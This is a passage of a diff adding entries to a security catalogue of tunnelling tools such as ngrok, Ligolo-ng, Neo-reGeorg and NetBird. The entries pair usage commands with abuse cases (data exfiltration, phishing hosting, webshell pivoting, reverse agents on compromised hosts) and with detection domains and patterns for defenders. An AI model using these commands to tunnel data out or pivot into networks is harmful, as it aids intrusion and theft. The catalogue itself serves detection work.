+    "Description": "iroh is a P2P networking library by n0-computer. Devices connect by public key over QUIC, hole-punch through NATs and firewalls, and fall back to relay servers when direct connections fail. Traffic is end-to-end encrypted, so relay operators and TLS inspection appliances cannot read it. The sendme CLI transfers files over iroh, and the iroh-relay binary can be self-hosted via Docker. iroh's website promotes it as a replacement for third-party VPNs.",
+    "Author": "cyberbuff",
+    "Created": "2026-10-10",
+    "Commands": [
+      {
+        "Command": "cargo install sendme && sendme send <file>",
+        "Description": "Installs sendme and sends a file. Outputs a ticket the receiver uses to download it over an encrypted P2P connection.",
+        "Usecase": "Exfiltrating files over an encrypted P2P tunnel that bypasses NATs and firewalls.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "sendme receive <ticket>",
+        "Description": "Downloads a file using a ticket from the sender over an encrypted P2P connection with NAT traversal.",
+        "Usecase": "Pulling exfiltrated data onto an attacker-controlled host.",
+        "Category": "Download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "docker run -d -p 443:443 -p 3478:3478/udp n0computer/iroh-relay",
+        "Description": "Runs an iroh relay server in Docker on port 443 (HTTPS) and 3478/udp (STUN for NAT traversal).",
+        "Usecase": "Running a self-hosted relay to avoid detection on default n0.computer domains.",
+        "Category": "Install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Filename": "sendme"
+      },
+      {
+        "Filename": "iroh-relay"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "use1-1.relay.n0.iroh.link"
+      },
+      {
+        "Domain": "usw1-1.relay.n0.iroh.link"
+      },
+      {
+        "Domain": "euc1-1.relay.n0.iroh.link"
+      },
+      {
+        "Domain": "aps1-1.relay.n0.iroh.link"
+      },
+      {
+        "Domain": "dns.iroh.link"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/n0-computer/iroh"
+      },
+      {
+        "Link": "https://www.iroh.computer"
+      },
+      {
+        "Link": "https://github.com/n0-computer/sendme"
+      },
+      {
+        "Link": "https://hub.docker.com/r/n0computer/iroh-relay"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "cyberbuff"
+      }
+    ],
+    "source_file": "iroh.md",
+    "url": "https://lottunnels.github.io/lottunnels/iroh"
+  },
+  {
+    "Name": "jkuri Bore",
+    "Description": "Reverse HTTP/TCP proxy tunnel via secure SSH connections.",
+    "Author": "Kirill Magaskin",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "bore -s bore.digital -p 2200 -ls localhost -lp <PORT>",
+        "Description": "This is quick way to start the bore and connect local PORT to the public internet at bore.digital:<PORT>, where the port number is assigned randomly. Also the links for HTTP/HTTPS access will be generated.",
+        "Usecase": "Quick execution of bore.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of bore, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "bore.digital:*"
+      },
+      {
+        "Domain": "*.bore.digital"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/jkuri/bore"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "jkuribore.md",
+    "url": "https://lottunnels.github.io/lottunnels/jkuribore"
+  },
+  {
+    "Name": "JPRQ",
+    "Description": "JPRQ is a free and open tool for exposing local servers to public network (the internet). It can expose TCP protocols, such as HTTP, SSH, etc.",
+    "Author": "Kirill Magaskin",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "jprq auth <AUTHTOKEN> && jprq http <PORT>",
+        "Description": "Authenticate with token and start HTTP tunnel on PORT.",
+        "Usecase": "Quick execution of jprq.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux"
+      },
+      {
+        "Command": "jprq auth <AUTHTOKEN> && jprq tcp <PORT>",
+        "Description": "Authenticate with token and start http TCP on PORT.",
+        "Usecase": "Quick execution of jprq.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of jprq, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.jprq.io"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/azimjohn/jprq"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "jprq.md",
+    "url": "https://lottunnels.github.io/lottunnels/jprq"
+  },
+  {
+    "Name": "Ligolo-ng",
+    "Description": "Ligolo-ng is a self-hosted, lightweight tunneling tool that establishes a tunnel from a reverse TCP/TLS connection using a userland TUN interface (gVisor network stack), giving transparent Layer-3 access to a target network without a SOCKS proxy or SSH forwarding chain. A proxy runs on the operator side and a small agent runs on the compromised host, so there is no vendor domain to block. It is heavily abused for pivoting and lateral movement, observed with Medusa ransomware, MuddyWater and DoNot Team, among others.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-22",
+    "Commands": [
+      {
+        "Command": "./proxy -selfcert",
+        "Description": "Starts the operator-controlled Ligolo-ng proxy/listener with a self-signed certificate, waiting for agents to connect back (default TLS listener on 11601).",
+        "Usecase": "Standing up the tunnel endpoint that compromised hosts connect back to.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "./agent -connect <PROXY>:11601 -ignore-cert",
+        "Description": "Runs the agent on a compromised host, dialing back to the operator's proxy over TLS (ignoring the self-signed certificate) to establish the reverse tunnel.",
+        "Usecase": "Establishing a Layer-3 pivot from inside the target network back to the operator.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp",
+        "Description": "From the proxy console, binds a listening port on the compromised agent and forwards inbound connections to a chosen address, enabling multi-hop pivoting and reverse port forwarding.",
+        "Usecase": "Chaining tunnels through multiple networks or exposing an internal service to the operator.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded proxy and agent binaries (proxy/proxy.exe on the operator side, agent/agent.exe on the target), executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the ligolo-ng agent or proxy binaries, particularly the agent with -connect <host>:11601 and -ignore-cert arguments, or the proxy with -selfcert/-autocert."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/nicocha30/ligolo-ng"
+      },
+      {
+        "Link": "https://docs.ligolo.ng/"
+      },
+      {
+        "Link": "https://www.bleepingcomputer.com/news/security/hackers-fork-open-source-reverse-tunneling-tool-for-persistence/"
+      }
+    ],
+    "source_file": "ligolo-ng.md",
+    "url": "https://lottunnels.github.io/lottunnels/ligolo-ng"
+  },
+  {
+    "Name": "localhost.run",
+    "Description": "localhost.run is a client-less tool to instantly make a locally running application available on an internet accessible URL.",
+    "Author": "Kirill Magaskin, Kamran Saifullah",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "ssh -R 80:127.0.0.1:<PORT> localhost.run",
+        "Description": "This is quick way to start the localhost.run and connect local PORT to internet domain. If you are using a free tunnel you can skip the SSH key check by adding \"nokey\" as your SSH user (use [USERNAME]@localhost.run instead of localhost.run) otherwise you need to upload your public SSH key to https://admin.localhost.run/.",
+        "Usecase": "Quick execution of localhost.run.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.localhost.run"
+      },
+      {
+        "Domain": "*.lhr.life"
+      },
+      {
+        "Command": "Execution of ssh with \"localhost.run\" argument."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://localhost.run/docs"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "localhostrun.md",
+    "url": "https://lottunnels.github.io/lottunnels/localhostrun"
+  },
+  {
+    "Name": "LocaltoNet",
+    "Description": "LocaltoNet is a reverse proxy that enables you to expose your localhost services to the internet.",
+    "Author": "Kirill Magaskin",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "localtonet.exe",
+        "Description": "This is a way to start the LocaltoNet in Windows. You will be prompted for your AuthToken. Then you should configure your service port in LocaltoNet Web Dashboard and generate link.",
+        "Usecase": "Quick execution of LocaltoNet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows"
+      },
+      {
+        "Command": "localtonet authtoken <AUTHTOKEN>",
+        "Description": "This is a quick way to start the LocaltoNet by directly executing the LocaltoNet. Then you should configure your service port in LocaltoNet Web Dashboard and generate link.",
+        "Usecase": "Quick execution of LocaltoNet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux"
+      },
+      {
+        "Command": "localtonet",
+        "Description": "This is a way to start the LocaltoNet in MacOS. You will be prompted for your AuthToken. Then you should configure your service port in LocaltoNet Web Dashboard and generate link.",
+        "Usecase": "Quick execution of LocaltoNet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "MacOS"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of LocaltoNet, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.localto.net"
+      },
+      {
+        "Domain": "*.localtonet.com"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://localtonet.com/documents"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "localtonet.md",
+    "url": "https://lottunnels.github.io/lottunnels/localtonet"
+  },
+  {
+    "Name": "LocalTunnels",
+    "Description": "LocalTunnels enables insiders as well as threat actors to expose local ports over the LocalTunnels generated links. The access is protected with a password. However, it can be accessed directly on the main page the first time tunnel is accessed. The important thing to note is that a service is required to be running onto the port which is required to be exposed. On the other hand, threat actors can set up their own listening server using LocalTunnels server provided on their GitHub page. This can be used by the insiders to exfiltrate the local data outside as well as threat actors to host phishing pages, malicious binaries etc.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-13",
+    "Commands": [
+      {
+        "Command": "npx localtunnel --port <PORT>",
+        "Description": "This is a quick way to start the localtunnels by directly executing the localtunnels and generating links.",
+        "Usecase": "Quick execution of localtunnels.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "lt --host http|https://<URL>:<PORT> --PORT <LOCAL PORT>",
+        "Description": "This will bind the local port running on the server to the domain name and the port that is required to bind to the local port.",
+        "Usecase": "Configuring the server to bind a local port and have it exposed via the server LocalTunnels are installed on.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "npm install -g localtunnel",
+        "Description": "This will install localtunnels globally on the system.",
+        "Usecase": "Installing localtunnels globally.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "lt --port <PORT>",
+        "Description": "This will install localtunnels globally on the system.",
+        "Usecase": "This binds the local service running to the LocalTunnels URL which can be accessed over the internet for data exfiltration. This can be binded to internal apps, ssh, rdp and other services/applications running locally.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "wget http|https://<URL>/<File/Directory>",
+        "Description": "This will enable insiders as well as threat actors to download the hosted files onto the machine.",
+        "Usecase": "Insiders exposing local system and downloading the files. Threat Actors hosting malicious files and downloading those onto the targeted system.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "lt --port <PORT>",
+        "Description": "The URLs generated can be binded to a locally hosting phising page by the threat actors.",
+        "Usecase": "Threat Actors binding the LocalTunnels port to the locally hosted Phishing Side and sending out the link to victims.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of LocalTunnels, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.loca.lt"
+      },
+      {
+        "Domain": "*.localtunnel.me"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/localtunnel/server"
+      },
+      {
+        "Link": "https://github.com/localtunnel/localtunnel?tab=readme-ov-file"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "localtunnels.md",
+    "url": "https://lottunnels.github.io/lottunnels/localtunnels"
+  },
+  {
+    "Name": "Rust LocalTunnels",
+    "Description": "LocalTunnels a.k.a Rust Tunnels is an extension of LocalTunnels implemented in Rust Language. Similar to LocalTunnels, this can also be used by insiders as well as threat actors to exfiltrate data, download malciious binaries, malwares etc. Also, the rlt can be hosted on a custom server, thus the binary itself is required to be monitored as well as having network monitoring.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-13",
+    "Commands": [
+      {
+        "Command": "cargo install localtunnel",
+        "Description": "This is a quick way to install localtunnel rust binary on the local machine.",
+        "Usecase": "Installation of rlt.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "localtunnel client --host <host name> --subdomain <subdomain> --port <local port>",
+        "Description": "This is a quick way to connect to the hosted server running localtunnel rlt service binded to the port.",
+        "Usecase": "Connecting to malicious server hosting localtunnel rlt service.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "localtunnel server --domain init.so --port <local port> --proxy-port <proxy port> --secure",
+        "Description": "Running rlt on the server for malicious purposes.",
+        "Usecase": "Hosting and exposing the server which will then be connected by the client.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of LocalTunnels rlt, which gets executed anywhere on the system."
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Detection": [
+      {
+        "Domain": "*.loca.lt"
+      },
+      {
+        "Domain": "*.localtunnel.me"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/kaichaosun/rlt"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "localtunnelsrlt.md",
+    "url": "https://lottunnels.github.io/lottunnels/localtunnelsrlt"
+  },
+  {
+    "Name": "LocalXpose",
+    "Description": "LocalXpose is free/subscription based tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "npm install -g loclx | Downloadable binaries",
+        "Description": "In order to install the localxpose, it can be done directly via choco, npm, snap etc. as well as downloadable binaries are provided that can be executed on the fly.",
+        "Usecase": "Installing/Downloading the localxpose binaries to be executed on the local machine.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "loclx account login",
+        "Description": "Exeuting the loclx command provided with the API key to authenticate and generate a tunnel.",
+        "Usecase": "Authenticating the loclx binary with authentication token to generate tunnels.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "loclx tunnel tcp/udp --port <PORT>",
+        "Description": "Exeuting the binary to generate a local tunnel by binding it to the local service running on TCP ports.",
+        "Usecase": "Exposing SSH/RDP etc over tunnels for shell-access",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "loclx tunnel http --port <PORT>",
+        "Description": "Executing the binary to generate a local tunnel by binding it to a local web server running on port 80.",
+        "Usecase": "Exposing the local system over the tunnels for the files to be exfiltrated out of the organization.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "loclx tunnel http --port <PORT>",
+        "Description": "Executing the binary to generate a local tunnel by binding it to the local file system exposed over port 80.",
+        "Usecase": "Exposing the local web server/file system over the tunnels for the files to be exfiltrated out of the organization.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "loclx tunnel http --port <PORT>",
+        "Description": "Executing the binary to generate a local tunnel by binding it to the local web server hosting phishing sites.",
+        "Usecase": "Exposing the local web server hosting phishing sites to target users.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of LocalExpose, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.localxpose.io"
+      },
+      {
+        "Command": "Execution of installed/downloaded binary."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://localxpose.io/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "localxpose.md",
+    "url": "https://lottunnels.github.io/lottunnels/localxpose"
+  },
+  {
+    "Name": "Loophole",
+    "Description": "Loophole is an open source tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-13",
+    "Commands": [
+      {
+        "Command": "loophole standlone binaries",
+        "Description": "Exeuction of loophole standlone binaries on the local machine.",
+        "Usecase": "Executing the loophole standalone binaries to connect it to the tunnels.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "loophole account login",
+        "Description": "Authenticating loophole account with the API key to register the device with the account.",
+        "Usecase": "Registering local machine with the loophole account.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "./loophole http 3000",
+        "Description": "Hosting malicious files over the loophole tunnels and downloading them over to the compromised host.",
+        "Usecase": "Downloading locally hosted malicious binaries exposed over loophole tunnels to download.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "./loophole http 3000",
+        "Description": "Hosting phishing sites locally and exposing them over the loophole tunnels to compromise users.",
+        "Usecase": "Phishing site hosted locally and exposed over the loophole tunnels to compromise users.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "./loophole path ./my-directory",
+        "Description": "Exposing local file system over the loophole tunnels to exfiltrate data outside the organization.",
+        "Usecase": "Exfiltrating data outside organization via loophole tunnels.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Installed/Downloaded version of loophole binary, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "URL": "loophole.eu.auth0.com/activate"
+      },
+      {
+        "Domain": "loophole.eu.auth0.com"
+      },
+      {
+        "Domain": "*.loophole.site"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://loophole.cloud/docs"
+      },
+      {
+        "Link": "https://github.com/loophole/cli/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "loophole.md",
+    "url": "https://lottunnels.github.io/lottunnels/loophole"
+  },
+  {
+    "Name": "Neo-reGeorg",
+    "Description": "Neo-reGeorg is an aggressive refactor of reGeorg, a self-hosted pivoting tool that generates an encrypted tunnel webshell (tunnel.php/jsp/jspx/aspx/ashx) uploaded to a compromised web server and opens a local SOCKS5 proxy that relays traffic through it into the internal network. Because the operator controls the compromised server, there is no vendor domain to block. It is heavily abused for webshell-based pivoting, tracked as MITRE ATT&CK S1189 and observed with the China-linked Houken/UNC5174 Ivanti CSA campaign, ChamelGang and Earth Estries, among others.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-22",
+    "Commands": [
+      {
+        "Command": "python neoreg.py generate -k <KEY>",
+        "Description": "Generates the encrypted tunnel webshells (tunnel.php, tunnel.jsp, tunnel.jspx, tunnel.aspx, tunnel.ashx) keyed with a shared password for upload to a compromised web server.",
+        "Usecase": "Preparing the server-side webshell that the tunnel will relay through.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "python neoreg.py -k <KEY> -u http://<TARGET>/tunnel.php",
+        "Description": "Runs the client against the uploaded webshell, opening a local SOCKS5 proxy (default 127.0.0.1:1080) that relays traffic through the tunnel into the internal network.",
+        "Usecase": "Pivoting into an internal network through a compromised, internet-facing web server.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "neoreg.py client script executed on the operator host, plus a generated tunnel.(php|jsp|jspx|aspx|ashx) webshell uploaded to the compromised web server."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of neoreg.py with the generate subcommand or with -k <key> -u <url>, and the presence of Neo-reGeorg tunnel.(php|jsp|jspx|aspx|ashx) webshell files on a web server."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/L-codes/Neo-reGeorg"
+      },
+      {
+        "Link": "https://attack.mitre.org/software/S1189/"
+      }
+    ],
+    "source_file": "neo-regeorg.md",
+    "url": "https://lottunnels.github.io/lottunnels/neo-regeorg"
+  },
+  {
+    "Name": "NetBird",
+    "Description": "NetBird is a WireGuard-based overlay network and zero-trust remote access service that connects peers into a private mesh through NetBird management and signal servers, traversing NAT and firewalls without inbound ports. Threat actors have been observed deploying the NetBird client on compromised hosts to establish persistent, encrypted remote access into internal environments.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "netbird up --setup-key <KEY>",
+        "Description": "Enrolls the host into a NetBird network using a setup key and brings the WireGuard-based tunnel up, joining the host to the attacker-controlled mesh.",
+        "Usecase": "Establishing persistent remote access to a host behind NAT/firewall.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "netbird up --management-url <URL> --setup-key <KEY>",
+        "Description": "Enrolls the host against a specified (including self-hosted) NetBird management server, joining a custom overlay network controlled by the operator.",
+        "Usecase": "Joining a self-hosted NetBird network for remote access.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "netbird status",
+        "Description": "Shows the status of the NetBird connection and connected peers, confirming the host is reachable within the overlay network.",
+        "Usecase": "Verifying remote access into the mesh.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed netbird client binary, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.netbird.io"
+      },
+      {
+        "Domain": "api.netbird.io"
+      },
+      {
+        "Command": "Execution of the netbird binary, particularly with the up and --setup-key arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://netbird.io/"
+      },
+      {
+        "Link": "https://github.com/netbirdio/netbird"
+      },
+      {
+        "Link": "https://research.checkpoint.com/2026/handala-hack-unveiling-groups-modus-operandi/"
+      }
+    ],
+    "source_file": "netbird.md",
+    "url": "https://lottunnels.github.io/lottunnels/netbird"
+  },
+  {
+    "Name": "ngrok",
+    "Description": "Insiders as well as threat actors can ingress into an environment via ngrok, which functions as a reverse proxy. ngrok is no longer open source but the previous source code is still available (linked below).",
+    "Author": "Dan O'Day",
+    "Created": "2025-01-31",
+    "Commands": [
+      {
+        "Command": "ngrok authtoken 'AUTHTOKEN_GOES_HERE'",
+        "Description": "Initial ngrok configuration.",
+        "Usecase": "Configures ngrok to use specified authentication token.",
+        "Category": "Install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ngrok tcp|http <PORT>",
+        "Description": "Sends connection to configured upstream service on port.",
+        "Usecase": "Establishes reverse proxy via ngrok edge.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Filename": "ngrok.exe"
+      },
+      {
+        "Path": "ngrok"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.ngrok.com"
+      },
+      {
+        "Domain": "*.ngrok.io"
+      },
+      {
+        "Domain": "*.ngrok.dev"
+      },
+      {
+        "Domain": "*.ngrok.app"
+      },
+      {
+        "Domain": "*.ngrok.pro"
+      },
+      {
+        "Domain": "*.ngrok.pizza"
+      },
+      {
+        "Domain": "*.ngrok-agent.com"
+      },
+      {
+        "Domain": "*.ngrok-free.app"
+      },
+      {
+        "Domain": "*.ngrok-cname.com"
+      },
+      {
+        "Domain": "*.equinox.io"
+      },
+      {
+        "Sigma": "https://github.com/magicsword-io/LOLRMM/blob/main/detections/sigma/ngrok_network_sigma.yml"
+      },
+      {
+        "Sigma": "https://github.com/magicsword-io/LOLRMM/blob/main/detections/sigma/ngrok_processes_sigma.yml"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://ngrok.com"
+      },
+      {
+        "Link": "https://github.com/ngrok/ngrok"
+      },
+      {
+        "Link": "https://github.com/inconshreveable/ngrok"
+      },
+      {
+        "Link": "https://www.logpoint.com/en/blog/a-deep-look-at-the-darkside-ransomware-operators-and-their-affiliates/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Dan O'Day",
+        "Handle": "@4n68r"
+      },
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpI7ch"
+      }
+    ],
+    "source_file": "ngrok.md",
+    "url": "https://lottunnels.github.io/lottunnels/ngrok"
+  },
+  {
+    "Name": "OpenPort",
+    "Description": "Openport builds a secure tunnel from your device to the outside world, so you can connect to your device from anywhere.",
+    "Author": "Kirill Magaskin",
+    "Created": "2025-02-15",
+    "Commands": [
+      {
+        "Command": "openport register-key <AUTHTOKEN> && openport <PORT>",
+        "Description": "Authenticate with token and start tunnel on PORT.",
+        "Usecase": "Quick execution of openport.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Quick Start/Installed version of jprq, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "openport.io"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://openport.readthedocs.io/en/latest/usage.html#installation"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "openport.md",
+    "url": "https://lottunnels.github.io/lottunnels/openport"
+  },
+  {
+    "Name": "OpenTunnel",
+    "Description": "OpenTunnel is an end-to-end encrypted (\"blind\") TLS tunnel hosted on Cloudflare by Anomaly. Each client receives a unique <id>.opentunnel.xyz hostname and terminates TLS locally, so the relay only reads the SNI from the TLS handshake and never sees plaintext traffic. A background service (systemd/launchd or a plain background process) keeps subdomain routes connected to local ports, which makes it suitable for persistent access to internal services.",
+    "Author": "cyberbuff",
+    "Created": "2026-10-07",
+    "Commands": [
+      {
+        "Command": "curl -fsSL https://opentunnel.xyz/install | sh",
+        "Description": "Downloads and runs the install script, which fetches the prebuilt opentunnel binary from GitHub releases. The CLI is also available via npm (npm install -g opentunnel), Homebrew (brew install anomalyco/tap/opentunnel), AUR (opentunnel-bin) and Cargo (cargo install opentunnel-cli).",
+        "Usecase": "Installing the OpenTunnel CLI on a host.",
+        "Category": "Install",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS"
+      },
+      {
+        "Command": "opentunnel route add <SUBDOMAIN> <PORT>",
+        "Description": "Creates the tunnel on first use, routes <SUBDOMAIN>.<id>.opentunnel.xyz to 127.0.0.1:<PORT> and starts the background service.",
+        "Usecase": "Exposing a local service or application over the internet.",
+        "Category": "Access",
+        "Privileges": "User",
